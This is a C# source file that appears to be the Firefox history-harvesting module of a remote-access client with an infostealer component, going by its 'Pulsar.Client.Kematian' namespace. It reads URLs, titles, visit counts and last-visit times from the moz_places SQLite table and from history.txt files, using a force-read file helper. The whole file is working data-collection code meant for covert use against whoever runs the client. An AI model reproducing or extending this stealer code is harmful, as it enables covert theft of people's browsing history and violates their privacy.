using Pulsar.Client.Kematian.Browsers.Helpers.SQL;
using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace Pulsar.Client.Kematian.Browsers.Gecko.History
{
    public class HistoryGecko
    {
        public static List<HistoryData> GetHistoryGecko(string database)
        {
            var historyData = new List<HistoryData>();
            if (!File.Exists(database))
            {
                return historyData;
            }
            
            if (database.EndsWith("history.txt", StringComparison.OrdinalIgnoreCase))
            {
                return ParseHistoryTextFile(database);
            }

            SQLiteHandler sqlDatabase;
            try
            {
                sqlDatabase = new SQLiteHandler(database);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to open SQLite database: {ex.Message}");
                return historyData;
            }
            if (!sqlDatabase.ReadTable("moz_places"))
            {
                Debug.WriteLine("Failed to read 'moz_places' table from database.");
                return historyData;
            }
            for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
            {
                try
                {
                    var url = sqlDatabase.GetValue(i, "url");
                    var title = sqlDatabase.GetValue(i, "title");
                    var visitCount = sqlDatabase.GetValue(i, "visit_count");
                    var lastVisitTime = sqlDatabase.GetValue(i, "last_visit_date");

                    historyData.Add(new HistoryData(url, title, visitCount, lastVisitTime));
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Failed to retrieve history data from database: {ex.Message}");
                }
            }
            
            return historyData;
        }
        
        private static List<HistoryData> ParseHistoryTextFile(string filePath)
        {
            var historyData = new List<HistoryData>();
            
            try
            {
                if (File.Exists(filePath))
                {

                    //string[] lines = File.ReadAllLines(filePath);
                    var lines = FileHandlerXeno.ForceReadFileString(filePath);
                    var split_lines = lines.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);

                    foreach (string line in split_lines)
                    {
                        if (string.IsNullOrWhiteSpace(line))
                            continue;
                            
                        try
                        {
                            var url = line.Trim();
                            var title = "";
                            
                            if (url.StartsWith("http://") || url.StartsWith("https://"))
                            {
                                historyData.Add(new HistoryData(url, title, "1", DateTime.Now.ToString()));
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error parsing history.txt line: {ex.Message}");
                        }
                    }
                    
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error reading history text file: {ex.Message}");
            }
            
            return historyData;
        }
    }
}
